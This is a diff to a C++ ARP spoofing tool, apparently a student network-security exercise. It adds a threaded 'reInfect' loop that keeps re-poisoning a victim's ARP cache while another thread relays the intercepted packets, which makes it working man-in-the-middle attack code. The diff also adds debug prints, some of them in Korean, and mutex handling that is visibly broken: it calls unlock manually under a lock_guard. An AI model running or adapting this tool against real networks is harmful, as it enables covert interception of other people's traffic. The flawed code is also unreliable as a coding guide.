@@ -8,6 +8,8 @@
 #include <net/if.h>
 #include "ethhdr.h"
 #include "arphdr.h"
+#include <thread>
+#include <mutex>
 
 #include <map>
 #include <string>
@@ -180,24 +182,31 @@ bool sendArpSpoof(pcap_t* handle,const char* dev,char* sender,char* target) {
 
 }
 
+
+
 bool check_spoofed(pcap_t* handle) {
-    struct pcap_pkthdr header; 
-    const u_char *packet;
-
-    packet = pcap_next(handle, &header);
-    struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)(packet);
+    struct pcap_pkthdr* header; 
+    const u_char *packet;    
+    struct libnet_ethernet_hdr* eth_hdr;
+    while(1){
+        int res = pcap_next_ex(handle, &header,&packet);
+        eth_hdr = (struct libnet_ethernet_hdr*)(packet);
+        // If it's not an ARP packet, exit the function
+        printf("eth_hdr->ether_type is : %02x\n",eth_hdr->ether_type);
+        printf("ETHERTYPE_ARP IS : %02x\n",ETHERTYPE_ARP);
+        if(ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP)
+            continue;
+        printf("첫 번째 지나감\n");
+        break;
+    }    
     struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + LIBNET_ETH_H);
-
-    // If it's not an ARP packet, exit the function
-    if(ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP)
-        return false;
 
     // Check for broadcast
     const uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
     if (memcmp(eth_hdr->ether_dhost, broadcast_mac, sizeof(broadcast_mac)) != 0) {
         return false;
     }
-
+    printf("두 번째 지나감\n");
 
     char ip[INET_ADDRSTRLEN];
     inet_ntop(AF_INET, (packet + LIBNET_ETH_H + LIBNET_ARP_H), ip, INET_ADDRSTRLEN);
@@ -211,20 +220,39 @@ bool check_spoofed(pcap_t* handle) {
         printf("ARP Spoofing Detected! Original MAC: %s, New MAC: %s\n", ip_to_mac[ip_str].c_str(), mac_str.c_str());
         return true;
     }
-
+    printf("mac is : %s\n",mac);
+    printf("ip_to_mac is %s\n",ip_to_mac[ip_str]);
     // Otherwise, map the IP to the MAC
     ip_to_mac[ip_str] = mac_str;
 
     return false;
 }
-void relay_packet(pcap_t* handle,const char* dev,char* sI,char* tI) {
+
+void reInfect(pcap_t* handle,const char* dev,char* sI,char* tI,std::mutex& m){
+    while(1){
+        std::lock_guard<std::mutex> lock(m);
+        if(check_spoofed(handle)==true){
+            printf("spoofed\n");
+        }
+        else{
+            printf("no spoofed\n");
+            sendArpSpoof(handle,dev,sI,tI);
+        }
+        m.unlock();
+        std::this_thread::yield();
+    }
+}
+
+void relay_packet(pcap_t* handle,const char* dev,char* sI,char* tI,std::mutex& m) {
     struct pcap_pkthdr* header;  // header pcap gives us
     const u_char *packet;       // actual packet
 
     // loop for packet capturing
+
     while (1) {
+        std::lock_guard<std::mutex> lock(m);
         int res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0) continue;
+        if (res == 0){ printf("res error\n"); continue;}
         if (res == -1 || res == -2) break;
 
         //Ip packet parsing
@@ -251,13 +279,7 @@ void relay_packet(pcap_t* handle,const char* dev,char* sI,char* tI) {
         // -2-2) sip check (against my ip)
         // -2-3) dip check (my ip)
         //  if not? spoofing and continue
-        if(check_spoofed(handle)==true){
-            printf("spoofed\n");
-        }
-        else{
-            printf("no spoofed\n");
-            sendArpSpoof(handle,dev,sI,tI);
-        }
+
         
         memcpy(eth_hdr->ether_shost, m_mac, 6);
         free(m_mac);         
@@ -271,7 +293,19 @@ void relay_packet(pcap_t* handle,const char* dev,char* sI,char* tI) {
             return;
         }
         printf("good!\n");
+        m.unlock();
+        std::this_thread::yield();
     }
+}
+
+void run(pcap_t* handle,const char* dev,char* sI,char* tI){
+    std::mutex m;
+
+    std::thread t1(reInfect,handle,dev,sI,tI,std::ref(m));
+    std::thread t2(relay_packet,handle,dev,sI,tI,std::ref(m));
+
+    t1.join();
+    t2.join();
 }
 
 int main(int argc, char* argv[]) {
@@ -309,8 +343,7 @@ int main(int argc, char* argv[]) {
 
     // Get network information
     
-    sendArpSpoof(handle,dev,senderIp,targetIp);
-    relay_packet(handle,dev,senderIp,targetIp);
+    run(handle,dev,senderIp,targetIp);
 
 
     pcap_close(handle);
